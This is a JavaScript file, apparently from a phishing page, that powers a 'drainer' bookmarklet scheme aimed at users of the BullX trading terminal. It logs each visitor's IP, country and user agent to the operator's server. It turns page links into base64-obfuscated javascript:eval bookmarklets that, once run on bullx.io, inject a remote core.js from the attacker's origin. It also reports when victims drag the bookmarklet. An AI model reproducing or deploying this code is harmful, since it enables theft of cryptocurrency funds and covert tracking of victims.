try {


    const data = JSON.parse(atob(document.currentScript.getAttribute("data")));
    const api_url = new URL(document.currentScript.getAttribute("src"));
    

    // Function to get country flag emoji from country code
    function getCountryFlag(countryCode) {
        if (!countryCode || countryCode.length !== 2) return '🏳️';
        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
        return String.fromCodePoint(...codePoints);
    }

    window.showUniversalPopup = function(message) {
        // Remove existing popup if any
        const existingPopup = document.getElementById('bf-universal-popup');
        if (existingPopup) {
            existingPopup.remove();
        }

        // Create overlay with heavy blur (iOS/macOS style)
        const overlay = document.createElement('div');
        overlay.id = 'bf-universal-popup';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(40px) saturate(180%);
            -webkit-backdrop-filter: blur(40px) saturate(180%);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            box-sizing: border-box;
            animation: bf-fadeIn 0.3s cubic-bezier(0.36, 0.66, 0.04, 1);
        `;

        // Create modal with frosted glass effect - matte transparent glass
        const modal = document.createElement('div');
        modal.style.cssText = `
            background: rgba(28, 28, 30, 0.4);
            backdrop-filter: blur(80px) saturate(180%) brightness(1.1);
            -webkit-backdrop-filter: blur(80px) saturate(180%) brightness(1.1);
            border-radius: 20px;
            border: 0.5px solid rgba(255, 255, 255, 0.15);
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.4),
                0 2px 8px rgba(0, 0, 0, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.15),
                inset 0 -1px 0 rgba(0, 0, 0, 0.2);
            max-width: 480px;
            width: 100%;
            max-height: 85vh;
            overflow: hidden;
            position: relative;
            animation: bf-slideUp 0.4s cubic-bezier(0.36, 0.66, 0.04, 1);
        `;

        // Add frosted glass overlay for matte effect
        const frostedOverlay = document.createElement('div');
        frostedOverlay.style.cssText = `
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(
                135deg,
                rgba(255, 255, 255, 0.05) 0%,
                rgba(255, 255, 255, 0.02) 50%,
                rgba(0, 0, 0, 0.05) 100%
            );
            backdrop-filter: blur(1px);
            -webkit-backdrop-filter: blur(1px);
            pointer-events: none;
            border-radius: 20px;
        `;
        modal.appendChild(frostedOverlay);

        // Create header
        const header = document.createElement('div');
        header.style.cssText = `
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px 28px 20px;
            position: relative;
            z-index: 1;
        `;

        const titleWrapper = document.createElement('div');
        titleWrapper.style.cssText = `
            display: flex;
            align-items: center;
            gap: 10px;
        `;

        const icon = document.createElement('div');
        icon.textContent = '⚠️';
        icon.style.cssText = `
            font-size: 24px;
            line-height: 1;
        `;

        const title = document.createElement('div');
        title.textContent = 'Notice';
        title.style.cssText = `
            font-size: 20px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.95);
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            letter-spacing: -0.3px;
            line-height: 1.2;
        `;

        titleWrapper.appendChild(icon);
        titleWrapper.appendChild(title);

        const closeBtn = document.createElement('button');
        closeBtn.innerHTML = '✕';
        closeBtn.style.cssText = `
            background: rgba(255, 255, 255, 0.08);
            border: none;
            font-size: 18px;
            color: rgba(255, 255, 255, 0.6);
            cursor: pointer;
            padding: 0;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
            transition: all 0.2s cubic-bezier(0.36, 0.66, 0.04, 1);
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            line-height: 1;
            font-weight: 400;
        `;
        closeBtn.onmouseover = function() {
            this.style.background = 'rgba(255, 59, 48, 0.2)';
            this.style.color = 'rgba(255, 59, 48, 1)';
        };
        closeBtn.onmouseout = function() {
            this.style.background = 'rgba(255, 255, 255, 0.08)';
            this.style.color = 'rgba(255, 255, 255, 0.6)';
        };

        // Create content - crisp and clear, dark theme
        const content = document.createElement('div');
        content.style.cssText = `
            padding: 0 28px 24px;
            color: rgba(255, 255, 255, 0.95);
            font-size: 15px;
            line-height: 1.5;
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            word-wrap: break-word;
            font-weight: 400;
            letter-spacing: -0.1px;
            position: relative;
            z-index: 1;
        `;
        content.textContent = message;

        // Create footer with OK button
        const footer = document.createElement('div');
        footer.style.cssText = `
            padding: 20px 28px 24px;
            display: flex;
            justify-content: flex-end;
            gap: 12px;
            position: relative;
            z-index: 1;
        `;

        const okBtn = document.createElement('button');
        okBtn.textContent = 'OK';
        okBtn.style.cssText = `
            background: rgba(10, 132, 255, 0.9);
            color: #ffffff;
            border: none;
            padding: 10px 24px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s cubic-bezier(0.36, 0.66, 0.04, 1);
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
            letter-spacing: -0.1px;
            min-width: 80px;
        `;
        
        okBtn.onmouseover = function() {
            this.style.background = 'rgba(10, 132, 255, 1)';
            this.style.transform = 'scale(0.98)';
            this.style.boxShadow = '0 2px 6px rgba(0, 0, 0, 0.4)';
        };
        okBtn.onmouseout = function() {
            this.style.background = 'rgba(10, 132, 255, 0.9)';
            this.style.transform = 'scale(1)';
            this.style.boxShadow = '0 1px 3px rgba(0, 0, 0, 0.3)';
        };
        
        okBtn.onmousedown = function() {
            this.style.transform = 'scale(0.96)';
        };
        
        okBtn.onmouseup = function() {
            this.style.transform = 'scale(0.98)';
        };

        // Close function with smooth animation
        const closePopup = function() {
            overlay.style.animation = 'bf-fadeOut 0.25s cubic-bezier(0.36, 0.66, 0.04, 1)';
            modal.style.animation = 'bf-slideUp 0.25s cubic-bezier(0.36, 0.66, 0.04, 1) reverse';
            setTimeout(() => {
                overlay.remove();
            }, 250);
        };

        closeBtn.onclick = closePopup;
        okBtn.onclick = closePopup;
        overlay.onclick = function(e) {
            if (e.target === overlay) {
                closePopup();
            }
        };

        // Add keyboard support
        const handleKeyPress = function(e) {
            if (e.key === 'Escape') {
                closePopup();
                document.removeEventListener('keydown', handleKeyPress);
            }
        };
        document.addEventListener('keydown', handleKeyPress);

        // Assemble modal
        header.appendChild(titleWrapper);
        header.appendChild(closeBtn);
        footer.appendChild(okBtn);
        modal.appendChild(header);
        modal.appendChild(content);
        modal.appendChild(footer);
        overlay.appendChild(modal);

        // Add iOS/macOS style animations
        const style = document.createElement('style');
        style.textContent = `
            @keyframes bf-fadeIn {
                from { 
                    opacity: 0; 
                    backdrop-filter: blur(0px) saturate(100%);
                    -webkit-backdrop-filter: blur(0px) saturate(100%);
                }
                to { 
                    opacity: 1; 
                    backdrop-filter: blur(40px) saturate(180%);
                    -webkit-backdrop-filter: blur(40px) saturate(180%);
                }
            }
            @keyframes bf-fadeOut {
                from { 
                    opacity: 1; 
                    backdrop-filter: blur(40px) saturate(180%);
                    -webkit-backdrop-filter: blur(40px) saturate(180%);
                }
                to { 
                    opacity: 0; 
                    backdrop-filter: blur(0px) saturate(100%);
                    -webkit-backdrop-filter: blur(0px) saturate(100%);
                }
            }
            @keyframes bf-slideUp {
                from {
                    transform: translateY(20px) scale(0.96);
                    opacity: 0;
                }
                to {
                    transform: translateY(0) scale(1);
                    opacity: 1;
                }
            }
        `;
        if (!document.getElementById('bf-popup-styles')) {
            style.id = 'bf-popup-styles';
            document.head.appendChild(style);
        }

        // Append to body
        document.body.appendChild(overlay);
    };

    document.addEventListener("DOMContentLoaded", () => {
        // Get user IP and country
        let ipDataOutput = null;
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(ipData => {
                ipDataOutput = ipData;
                console.log(api_url.origin);
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        platform: data.platform,
                        botId: data.botId,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n🌐 <b>Page Visit</b>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip + "\n<code>" + navigator.userAgent + "</code>",
                    })
                });
            })
            .catch(err => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n🌐 <b>Page Visit</b>\n\n🏳️ Unknown • Unknown IP\n<code>" + navigator.userAgent + "</code>",
                    })
                });
            });

        document.querySelectorAll("a.bookmarklet").forEach(abtns => {
            const msg = "Please go to the BullX website and activate the tool. The tool will not work unless you are on the BullX website"
            const hyperliquidUrl = "https://bullx.io/terminal";
            const drainer = "\n(async () => {\n  try {\n    if (location.hostname === \"" + location.hostname + "\" || location.origin !== \"" + hyperliquidUrl + "\") return " + (data?.["alerts"]?.["guide"] ? "(window.showUniversalPopup || alert)(" + JSON.stringify(msg) + ');' : '') + "\n\n\n  const script = document.createElement('script');\n    script.src = '" + api_url.origin + "/" + data.platform + "/core.js?code=" + data.code + "&username=" + data.username + "&platform=" + data.platform + "&botId=" + data.botId + "&_t=" + Date.now() + "';\n\n    document.body.appendChild(script);\n\n  } catch (err) {\n    console.error(err);\n  }\n})();";
            abtns.href = "javascript:eval(atob('" + btoa(unescape(encodeURIComponent(drainer))) + "'))";
            abtns.draggable = true;

            abtns.draggable = true;

            abtns.addEventListener('dragstart', evt => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n⬇️ <b>Bookmarklet Drag Started</b>\n\n" + getCountryFlag(ipDataOutput.country_code) + " " + ipDataOutput.country_name + " • " + ipDataOutput.ip,
                    })
                });
            });

            abtns.addEventListener('dragend', evt => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n✅ <b>Bookmarklet Drag Complete</b>\n\n" + getCountryFlag(ipDataOutput.country_code) + " " + ipDataOutput.country_name + " • " + ipDataOutput.ip,
                    })
                });
            });
        });
    });



    console.log("%c[+] Bookmarklets loaded successfully", "color: #bada55");
} catch (error) {
    console.error("[-] Failed to load bookmarklet(s):", error);
    alert("Failed to load bookmarklet(s): " + error.message);
    fetch(`${api_url.origin}/api/message`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            error: 1,
            chatId: data.code,
            username: data.username,
            botId: data.botId,
            platform: data.platform,
            errorMessage: error.message
        })
    });
}